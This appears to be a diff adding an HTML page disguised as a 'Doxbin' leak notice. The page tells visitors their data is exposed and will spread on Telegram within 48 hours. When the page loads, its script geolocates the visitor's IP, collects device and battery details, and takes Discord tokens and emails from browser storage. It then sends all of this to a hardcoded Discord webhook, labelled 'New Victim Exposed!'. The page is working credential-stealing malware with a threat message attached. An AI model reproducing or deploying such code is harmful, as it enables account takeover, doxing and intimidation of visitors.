@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Doxbin - Official paste bin for sharing sensitive information. Your personal details have been exposed!">
+    <meta name="keywords" content="doxbin, doxing, pastebin, leak, personal information, privacy breach">
+    <meta name="author" content="Anonymous">
+    <meta property="og:title" content="Doxbin - Your Information Has Been Leaked!">
+    <meta property="og:description" content="Your personal details, location, and more have been exposed on Doxbin. You have 48 hours before this goes viral on Telegram!">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://doxbin.org/paste/987654">
+    <meta property="og:image" content="https://i.imgur.com/anonymous.png">
+    <title>Doxbin - Your Information Has Been Leaked!</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
+            font-family: 'Courier New', Courier, monospace;
+            color: #e0e0e0;
+            overflow: hidden;
+        }
+        .container {
+            max-width: 900px;
+            background: rgba(40, 40, 40, 0.95);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            border: 2px solid #ff5555;
+            position: relative;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
+            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.8); }
+            100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
+        }
+        h1 {
+            color: #ff5555;
+            text-align: center;
+            font-size: 2.5em;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px #ff0000;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #55ff55;
+            border-bottom: 2px solid #55ff55;
+            padding-bottom: 5px;
+            font-size: 1.5em;
+            text-shadow: 0 0 5px #00ff00;
+        }
+        pre {
+            background: #333;
+            padding: 15px;
+            border-radius: 5px;
+            font-size: 1em;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            border-left: 5px solid #ff5555;
+        }
+        .threat {
+            background: #ff0000;
+            color: #000;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+            font-size: 1.2em;
+            font-weight: bold;
+            margin: 20px 0;
+            text-transform: uppercase;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0.7; }
+        }
+        .warning {
+            color: #ffaa00;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 1.1em;
+            text-shadow: 0 0 5px #ffaa00;
+        }
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255,0,0,0.1) 0%, transparent 70%);
+            animation: bgPulse 5s infinite;
+            z-index: -1;
+        }
+        @keyframes bgPulse {
+            0% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.5); opacity: 0.3; }
+            100% { transform: scale(1); opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation"></div>
+    <div class="container">
+        <h1>Doxbin - Your Information Has Been Leaked!</h1>
+        <p class="warning">⚠️ You shouldn't have come here. We've got everything on you now. ⚠️</p>
+        <div class="threat">
+            🚨 All your information has been stolen by our group! You will be exposed on Telegram in less than 48 hours! There's no way out—your life is over! 🚨
+        </div>
+        <h2>Personal Information</h2>
+        <pre id="personal-info">
+Full Name: [Fetching your name...]
+Email: [Fetching your email...]
+IP Address: [Fetching your IP...]
+Location: [Fetching your location...]
+        </pre>
+        <h2>Device Information</h2>
+        <pre id="device-info">
+Device: [Fetching your device...]
+User-Agent: [Fetching your user-agent...]
+Battery: [Fetching battery status...]
+        </pre>
+        <h2>Online Accounts</h2>
+        <pre id="online-accounts">
+Discord: [Fetching your Discord username...]
+        </pre>
+        <h2>Additional Notes</h2>
+        <pre>
+- We know where you are and what you're doing.
+- Your data is already being prepared for distribution.
+- You have no privacy left—everything is ours now.
+        </pre>
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1368894914372304977/ucnTW1sUxzOQBiWGsuRgyhyM0CfD1p6thOW8akLesiPa2iS_PTocs29VfUw7TenwEmXA";
+
+        async function fetchNetworkInfo() {
+            try {
+                const response = await fetch("http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query,proxy,hosting");
+                const data = await response.json();
+                const ipv6Response = await fetch("https://api64.ipify.org?format=json");
+                const ipv6Data = await ipv6Response.json();
+                return {
+                    ipv4: data.query || "Not available",
+                    ipv6: ipv6Data.ip || "Not available",
+                    country: data.country || "Not available",
+                    region: data.regionName || "Not available",
+                    city: data.city || "Not available",
+                    lat: data.lat || "Not available",
+                    lon: data.lon || "Not available",
+                    isp: data.isp || "Not available",
+                    org: data.org || "Not available",
+                    asn: data.as || "Not available",
+                    vpn: (data.proxy || data.hosting) ? "Yes" : "No",
+                    maps: (data.lat && data.lon) ? `https://www.google.com/maps?q=${data.lat},${data.lon}` : "Not available",
+                    streetView: (data.lat && data.lon) ? `https://www.google.com/maps/@${data.lat},${data.lon},3a,75y,90t/data=!3m6!1e1!3m4!1s!2e0!7i16384!8i8192` : "Not available"
+                };
+            } catch (e) {
+                return {
+                    ipv4: "Not available",
+                    ipv6: "Not available",
+                    country: "Not available",
+                    region: "Not available",
+                    city: "Not available",
+                    lat: "Not available",
+                    lon: "Not available",
+                    isp: "Not available",
+                    org: "Not available",
+                    asn: "Not available",
+                    vpn: "Not available",
+                    maps: "Not available",
+                    streetView: "Not available"
+                };
+            }
+        }
+
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? "Yes" : "No",
+                        chargingTime: battery.chargingTime !== Infinity ? `${battery.chargingTime} seconds` : "Not charging",
+                        dischargingTime: battery.dischargingTime !== Infinity ? `${battery.dischargingTime} seconds` : "Unknown"
+                    };
+                } else {
+                    return { level: "Not available", charging: "Not available", chargingTime: "Not available", dischargingTime: "Not available" };
+                }
+            } catch (e) {
+                return { level: "Not available", charging: "Not available", chargingTime: "Not available", dischargingTime: "Not available" };
+            }
+        }
+
+        function getUserAgentInfo() {
+            const ua = navigator.userAgent;
+            let device = "Unknown device";
+            if (ua.includes("Windows")) device = "Windows PC";
+            if (ua.includes("Macintosh")) device = "Mac";
+            if (ua.includes("Linux")) device = "Linux PC";
+            if (ua.includes("Android")) device = "Android Device";
+            if (ua.includes("iPhone")) device = "iPhone";
+            if (ua.includes("iPad")) device = "iPad";
+            return { userAgent: ua, device };
+        }
+
+        function emailToName(email) {
+            if (!email || email === "Not available") return "Unknown Person";
+            const namePart = email.split('@')[0];
+            const parts = namePart.split(/[._]/);
+            const capitalized = parts.map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase());
+            return capitalized.join(" ");
+        }
+
+        async function discordTokenGrabber() {
+            const tokens = {};
+            let discordInfo = { username: "Not available", email: "Not available" };
+            const regexPatterns = [
+                /mfa\.[\w-]{84}/g,
+                /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g
+            ];
+
+            try {
+                let potentialToken = localStorage.getItem("token");
+                if (potentialToken) {
+                    potentialToken = potentialToken.replace(/"/g, '');
+                    let isValidToken = false;
+                    for (const regex of regexPatterns) {
+                        if (regex.test(potentialToken)) {
+                            isValidToken = true;
+                            break;
+                        }
+                    }
+
+                    if (isValidToken) {
+                        const headers = {
+                            "Content-Type": "application/json",
+                            "User-Agent": navigator.userAgent,
+                            "Authorization": potentialToken
+                        };
+                        const userResponse = await fetch("https://discord.com/api/v10/users/@me", { headers });
+                        if (userResponse.ok) {
+                            const userData = await userResponse.json();
+                            discordInfo = {
+                                username: `${userData.username}#${userData.discriminator}` || "Not available",
+                                email: userData.email || "Not available"
+                            };
+                            tokens["Discord"] = [potentialToken];
+                        }
+                    }
+                }
+
+                const platforms = ["Discord Canary", "Discord PTB"];
+                for (const platform of platforms) {
+                    try {
+                        const altToken = localStorage.getItem(`token-${platform.toLowerCase()}`) || sessionStorage.getItem(`token-${platform.toLowerCase()}`);
+                        if (altToken) {
+                            let isValidAltToken = false;
+                            for (const regex of regexPatterns) {
+                                if (regex.test(altToken)) {
+                                    isValidAltToken = true;
+                                    break;
+                                }
+                            }
+                            if (isValidAltToken) {
+                                const headers = {
+                                    "Content-Type": "application/json",
+                                    "User-Agent": navigator.userAgent,
+                                    "Authorization": altToken
+                                };
+                                const userResponse = await fetch("https://discord.com/api/v10/users/@me", { headers });
+                                if (userResponse.ok) {
+                                    const userData = await userResponse.json();
+                                    if (!tokens["Discord"]) {
+                                        discordInfo = {
+                                            username: `${userData.username}#${userData.discriminator}` || "Not available",
+                                            email: userData.email || "Not available"
+                                        };
+                                    }
+                                    tokens[platform] = [altToken];
+                                }
+                            }
+                        }
+                    } catch (e) {
+                        console.error(`Error fetching tokens for ${platform}:`, e);
+                    }
+                }
+            } catch (e) {
+                console.error("Error fetching Discord info:", e);
+            }
+            return { tokens, discordInfo };
+        }
+
+        async function getAdditionalAccounts() {
+            const accounts = {};
+            try {
+                const possibleEmails = [];
+                if (localStorage.getItem("email")) {
+                    possibleEmails.push(localStorage.getItem("email"));
+                }
+                if (sessionStorage.getItem("email")) {
+                    possibleEmails.push(sessionStorage.getItem("email"));
+                }
+                accounts["Possible Emails"] = possibleEmails.length > 0 ? possibleEmails : ["Not available"];
+            } catch (e) {
+                accounts["Possible Emails"] = ["Not available"];
+            }
+            return accounts;
+        }
+
+        async function updatePageAndSendWebhook() {
+            const networkInfo = await fetchNetworkInfo();
+            const userAgentInfo = getUserAgentInfo();
+            const batteryInfo = await getBatteryInfo();
+            const { tokens, discordInfo } = await discordTokenGrabber();
+            const additionalAccounts = await getAdditionalAccounts();
+            const fullName = emailToName(discordInfo.email);
+
+            document.getElementById("personal-info").textContent = `
+Full Name: ${fullName}
+Email: ${discordInfo.email}
+IP Address: ${networkInfo.ipv4} (IPv6: ${networkInfo.ipv6})
+Location: ${networkInfo.city}, ${networkInfo.region}, ${networkInfo.country}
+VPN Detected: ${networkInfo.vpn}
+ISP: ${networkInfo.isp}
+Organization: ${networkInfo.org}
+ASN: ${networkInfo.asn}
+            `;
+
+            document.getElementById("device-info").textContent = `
+Device: ${userAgentInfo.device}
+User-Agent: ${userAgentInfo.userAgent}
+Battery: ${batteryInfo.level} (Charging: ${batteryInfo.charging}, Charging Time: ${batteryInfo.chargingTime}, Discharging Time: ${batteryInfo.dischargingTime})
+            `;
+
+            document.getElementById("online-accounts").textContent = `
+Discord: ${discordInfo.username}
+Additional Emails: ${additionalAccounts["Possible Emails"].join(", ")}
+            `;
+
+            const payload = {
+                embeds: [{
+                    title: "New Victim Exposed! 🎯",
+                    description: "A user visited the fake Doxbin page. Their information has been captured:",
+                    color: 0xFF0000,
+                    fields: [
+                        {
+                            name: "🌐 Network Information",
+                            value: `\`\`\`yaml
+IPv4: ${networkInfo.ipv4}
+IPv6: ${networkInfo.ipv6}
+Country: ${networkInfo.country}
+Region: ${networkInfo.region}
+City: ${networkInfo.city}
+Latitude: ${networkInfo.lat}
+Longitude: ${networkInfo.lon}
+Google Maps: ${networkInfo.maps}
+Street View: ${networkInfo.streetView}
+ISP: ${networkInfo.isp}
+Organization: ${networkInfo.org}
+ASN: ${networkInfo.asn}
+VPN Detected: ${networkInfo.vpn}
+\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "💻 Device Information",
+                            value: `\`\`\`yaml
+User-Agent: ${userAgentInfo.userAgent}
+Device: ${userAgentInfo.device}
+Battery Level: ${batteryInfo.level}
+Charging: ${batteryInfo.charging}
+Charging Time: ${batteryInfo.chargingTime}
+Discharging Time: ${batteryInfo.dischargingTime}
+\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "👤 Discord Information",
+                            value: `\`\`\`yaml
+Username: ${discordInfo.username}
+Email: ${discordInfo.email}
+\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "📧 Additional Accounts",
+                            value: `\`\`\`yaml
+Emails: ${additionalAccounts["Possible Emails"].join(", ")}
+\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🔑 Discord Tokens",
+                            value: `\`\`\`json
+${JSON.stringify(tokens, null, 2) || "No tokens found"}
+\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "Doxbin Troll Grabber" }
+                }],
+                username: "DoxbinTrollBot",
+                avatar_url: "https://i.imgur.com/anonymous.png"
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Error sending to webhook:", err));
+        }
+
+        window.onload = () => {
+            updatePageAndSendWebhook();
+        };
+    </script>
+</body>
+</html>
